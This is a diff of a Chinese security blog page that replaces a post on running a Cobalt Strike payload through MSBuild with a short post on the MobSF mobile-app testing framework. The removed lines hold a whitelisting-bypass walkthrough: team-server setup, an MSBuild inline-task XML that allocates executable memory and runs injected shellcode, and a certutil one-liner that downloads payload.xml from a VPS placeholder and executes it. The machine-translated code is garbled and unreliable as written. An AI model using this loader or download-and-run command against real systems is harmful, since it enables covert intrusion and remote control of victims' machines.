@@ -79,23 +79,19 @@
 
 
 
-<meta name="description" content="环境配置 控制机：192.168.79.128 win7 x64目标机：192.168.79.147 win2008 R2 x64  0x01 Cobalt Strike运行服务：./TeamServer.exe 192.168.79.128 password新建监听：Cobalt Strike-&amp;gt;Listeners添加C# payload：Attacks-&amp;gt;Packages-&amp;gt;">
+<meta name="description" content="移动安全框架（MobSF）是一种自动化的一体化移动应用程序（Android / iOS / Windows）笔测试框架，能够执行静态，动态和恶意软件分析。它可用于Android，iOS和Windows移动应用程序的有效和快速安全分析，并支持二进制文件（APK，IPA和APPX）和压缩源代码。MobSF可以在运行时为Android应用程序进行动态应用程序测试，并具有由CapFuzz（一种特定于Web">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MSBuild执行Cobalt Strike payload">
-<meta property="og:url" content="https://enul1ttle.github.io/2019/03/13/MSBuild执行Cobalt-Strike-payload/index.html">
+<meta property="og:title" content="MobSF">
+<meta property="og:url" content="https://enul1ttle.github.io/2019/03/15/MobSF/index.html">
 <meta property="og:site_name" content="Enul1ttle">
-<meta property="og:description" content="环境配置 控制机：192.168.79.128 win7 x64目标机：192.168.79.147 win2008 R2 x64  0x01 Cobalt Strike运行服务：./TeamServer.exe 192.168.79.128 password新建监听：Cobalt Strike-&amp;gt;Listeners添加C# payload：Attacks-&amp;gt;Packages-&amp;gt;">
+<meta property="og:description" content="移动安全框架（MobSF）是一种自动化的一体化移动应用程序（Android / iOS / Windows）笔测试框架，能够执行静态，动态和恶意软件分析。它可用于Android，iOS和Windows移动应用程序的有效和快速安全分析，并支持二进制文件（APK，IPA和APPX）和压缩源代码。MobSF可以在运行时为Android应用程序进行动态应用程序测试，并具有由CapFuzz（一种特定于Web">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://enul1ttle.github.io/2019/03/13/MSBuild执行Cobalt-Strike-payload/1.png">
-<meta property="og:image" content="https://enul1ttle.github.io/2019/03/13/MSBuild执行Cobalt-Strike-payload/2.png">
-<meta property="og:image" content="https://enul1ttle.github.io/2019/03/13/MSBuild执行Cobalt-Strike-payload/3.png">
-<meta property="og:image" content="https://enul1ttle.github.io/2019/03/13/MSBuild执行Cobalt-Strike-payload/4.png">
-<meta property="og:image" content="https://enul1ttle.github.io/2019/03/13/MSBuild执行Cobalt-Strike-payload/5.png">
-<meta property="og:updated_time" content="2019-03-13T09:52:42.602Z">
+<meta property="og:image" content="https://enul1ttle.github.io/2019/03/15/MobSF/MobSF.png">
+<meta property="og:updated_time" content="2019-03-15T13:32:47.636Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MSBuild执行Cobalt Strike payload">
-<meta name="twitter:description" content="环境配置 控制机：192.168.79.128 win7 x64目标机：192.168.79.147 win2008 R2 x64  0x01 Cobalt Strike运行服务：./TeamServer.exe 192.168.79.128 password新建监听：Cobalt Strike-&amp;gt;Listeners添加C# payload：Attacks-&amp;gt;Packages-&amp;gt;">
-<meta name="twitter:image" content="https://enul1ttle.github.io/2019/03/13/MSBuild执行Cobalt-Strike-payload/1.png">
+<meta name="twitter:title" content="MobSF">
+<meta name="twitter:description" content="移动安全框架（MobSF）是一种自动化的一体化移动应用程序（Android / iOS / Windows）笔测试框架，能够执行静态，动态和恶意软件分析。它可用于Android，iOS和Windows移动应用程序的有效和快速安全分析，并支持二进制文件（APK，IPA和APPX）和压缩源代码。MobSF可以在运行时为Android应用程序进行动态应用程序测试，并具有由CapFuzz（一种特定于Web">
+<meta name="twitter:image" content="https://enul1ttle.github.io/2019/03/15/MobSF/MobSF.png">
 
 
 
@@ -125,13 +121,13 @@
 
 
 
-  <link rel="canonical" href="https://enul1ttle.github.io/2019/03/13/MSBuild执行Cobalt-Strike-payload/">
+  <link rel="canonical" href="https://enul1ttle.github.io/2019/03/15/MobSF/">
 
 
 
 
 
-  <title>MSBuild执行Cobalt Strike payload | Enul1ttle</title>
+  <title>MobSF | Enul1ttle</title>
   
 
 
@@ -258,7 +254,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://enul1ttle.github.io/2019/03/13/MSBuild执行Cobalt-Strike-payload/">
+    <link itemprop="mainEntityOfPage" href="https://enul1ttle.github.io/2019/03/15/MobSF/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Enul1ttle">
@@ -275,7 +271,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">MSBuild执行Cobalt Strike payload</h1>
+          <h1 class="post-title" itemprop="name headline">MobSF</h1>
         
 
         <div class="post-meta">
@@ -287,8 +283,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-13T15:37:31+08:00">
-                2019-03-13
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-15T21:23:56+08:00">
+                2019-03-15
               </time>
             
 
@@ -310,8 +306,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
+                  <a href="/categories/工具/" itemprop="url" rel="index">
+                    <span itemprop="name">工具</span>
                   </a>
                 </span>
 
@@ -352,84 +348,10 @@
       
 
       
-        <h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><blockquote>
-<p>控制机：192.168.79.128 win7 x64<br>目标机：192.168.79.147 win2008 R2 x64</p>
-</blockquote>
-<h2 id="0x01-Cobalt-Strike"><a href="#0x01-Cobalt-Strike" class="headerlink" title="0x01 Cobalt Strike"></a>0x01 Cobalt Strike</h2><p>运行服务：<code>./TeamServer.exe 192.168.79.128 password</code><br>新建监听：<code>Cobalt Strike-&gt;Listeners</code><br>添加C# payload：<code>Attacks-&gt;Packages-&gt;Payload Generator</code><br><img src="1.png" alt></p>
+        <p>移动安全框架（MobSF）是一种自动化的一体化移动应用程序（Android / iOS / Windows）笔测试框架，能够执行静态，动态和恶意软件分析。它可用于Android，iOS和Windows移动应用程序的有效和快速安全分析，并支持二进制文件（APK，IPA和APPX）和压缩源代码。MobSF可以在运行时为Android应用程序进行动态应用程序测试，并具有由CapFuzz（一种特定于Web API的安全扫描程序）提供支持的Web API模糊测试功能。<br><img src="MobSF.png" alt><br>MobSF:<a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/" target="_blank" rel="noopener">https://github.com/MobSF/Mobile-Security-Framework-MobSF/</a><br>centos 安装Docker：<a href="http://www.runoob.com/docker/centos-docker-install.html" target="_blank" rel="noopener">http://www.runoob.com/docker/centos-docker-install.html</a><br>Docker：</p>
 <blockquote>
-<p>实际的渗透过程中，有时候x64的系统运行64位payload会出现MSBduild停止运行的情况。</p>
+<p><code>docker pull opensecurity/mobile-security-framework-mobsf</code><br><code>docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest</code></p>
 </blockquote>
-<h2 id="0x02-构造payload-xml"><a href="#0x02-构造payload-xml" class="headerlink" title="0x02 构造payload.xml"></a>0x02 构造payload.xml</h2><p>把CS生成的C#payload 替换掉<code>new byte [] {INSERT_SHELLCODE_HERE};</code></p>
-<pre><code>&lt; Project  ToolsVersion = “ 4.0 ”  xmlns = “ http://schemas.microsoft.com/developer/msbuild/2003 ” &gt;
-     &lt;！ -此内联任务执行shellcode。- &gt;
-     &lt;！ - C：\ Windows \ Microsoft.NET \ Framework \ v4.0.30319 \ msbuild.exe SimpleTasks.csproj - &gt;
-     &lt;！ -保存此文件并执行上述命令- &gt;
-     &lt;！ -作者：Casey Smith，Twitter：@subTee - &gt;
-     &lt;！ -许可证：BSD 3条款- &gt;
-  &lt; Target  Name = “ Hello ” &gt;
-    &lt; ClassExample /&gt;
-  &lt;/ Target &gt;
-  &lt; UsingTask
-    TASKNAME = “ ClassExample ”
-    TaskFactory = “ CodeTaskFactory ”
-    AssemblyFile = “ C：\ Windows \ Microsoft.Net \ Framework \ v4.0.30319 \ Microsoft.Build.Tasks.v4.0.dll ” &gt;
-    &lt; 任务 &gt;
-
-      &lt; Code  Type = “ Class ”  Language = “ cs ” &gt;
-      &lt;！[CDATA [
-    使用系统;
-    使用System.Runtime.InteropServices;
-    使用Microsoft.Build.Framework;
-    使用Microsoft.Build.Utilities;
-    public class ClassExample：Task，ITask
-    {         
-      private static UInt32 MEM_COMMIT = 0x1000;          
-      private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
-      [的DllImport（ “KERNEL32”）]
-        private static extern UInt32 VirtualAlloc（UInt32 lpStartAddr，
-        UInt32大小，UInt32 flAllocationType，UInt32 flProtect）;          
-      [的DllImport（ “KERNEL32”）]
-        private static extern IntPtr CreateThread（            
-        UInt32 lpThreadAttributes，
-        UInt32 dwStackSize，
-        UInt32 lpStartAddress，
-        IntPtr param，
-        UInt32 dwCreationFlags，
-        ref UInt32 lpThreadId           
-        ）;
-      [的DllImport（ “KERNEL32”）]
-        private static extern UInt32 WaitForSingleObject（           
-        IntPtr hHandle，
-        UInt32 dwMilliseconds
-        ）;          
-      public override bool Execute（）
-      {
-        byte [] shellcode = new byte [] {INSERT_SHELLCODE_HERE};
-
-          UInt32 funcAddr = VirtualAlloc（0，（UInt32）shellcode.Length，
-        MEM_COMMIT，PAGE_EXECUTE_READWRITE）;
-          Marshal.Copy（shellcode，0，（IntPtr）（funcAddr），shellcode.Length）;
-          IntPtr hThread = IntPtr.Zero;
-          UInt32 threadId = 0;
-          IntPtr pinfo = IntPtr.Zero;
-          hThread = CreateThread（0,0，funcAddr，pinfo，0，ref threadId）;
-          WaitForSingleObject（hThread，0xFFFFFFFF）;
-          返回true;
-      } 
-    }     
-      ]]&gt;
-      &lt;/ Code &gt;
-    &lt;/ Task &gt;
-  &lt;/ UsingTask &gt;
-&lt;/ Project &gt;
-</code></pre><p><img src="2.png" alt></p>
-<h2 id="0x03-使用方法"><a href="#0x03-使用方法" class="headerlink" title="0x03 使用方法"></a>0x03 使用方法</h2><p>目标机CMD查看是否安装有NET4：<br><code>for /r C:\Windows\Microsoft.NET\Framework\ %i in (MSBuild.exe) do @echo %i</code><br><img src="3.png" alt></p>
-<blockquote>
-<p>实战过程中也可以用这条命令查找web目录</p>
-</blockquote>
-<p>目标机运行payload.xml:<br><code>c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe payload.xml</code><br>CMD一句话运行payload.xml:<br><code>certutil -urlcache -split -f http://VPSip/payload.xml c:\windows\temp\payload.xml&amp;&amp;c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe  c:\windows\temp\payload.xml</code></p>
-<p><img src="4.png" alt></p>
-<h2 id="0x04-结果"><a href="#0x04-结果" class="headerlink" title="0x04 结果"></a>0x04 结果</h2><p><img src="5.png" alt><br><strong>原文</strong>：<a href="https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/" target="_blank" rel="noopener">https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/</a><br><strong>payload.xml</strong>:<a href="https://gist.github.com/ConsciousHacker/5fce0343f29085cd9fba466974e43f17" target="_blank" rel="noopener">https://gist.github.com/ConsciousHacker/5fce0343f29085cd9fba466974e43f17</a></p>
 
       
     </div>
@@ -454,15 +376,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2019/03/14/Centos7渗透工具自动化安装/" rel="next" title="Centos7渗透工具自动化安装">
+                <i class="fa fa-chevron-left"></i> Centos7渗透工具自动化安装
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/03/14/渗透测试在线资料整理/" rel="prev" title="渗透测试在线资料整理">
-                渗透测试在线资料整理 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -514,17 +436,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -575,22 +488,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境配置"><span class="nav-number">1.</span> <span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Cobalt-Strike"><span class="nav-number">2.</span> <span class="nav-text">0x01 Cobalt Strike</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-构造payload-xml"><span class="nav-number">3.</span> <span class="nav-text">0x02 构造payload.xml</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-使用方法"><span class="nav-number">4.</span> <span class="nav-text">0x03 使用方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-结果"><span class="nav-number">5.</span> <span class="nav-text">0x04 结果</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
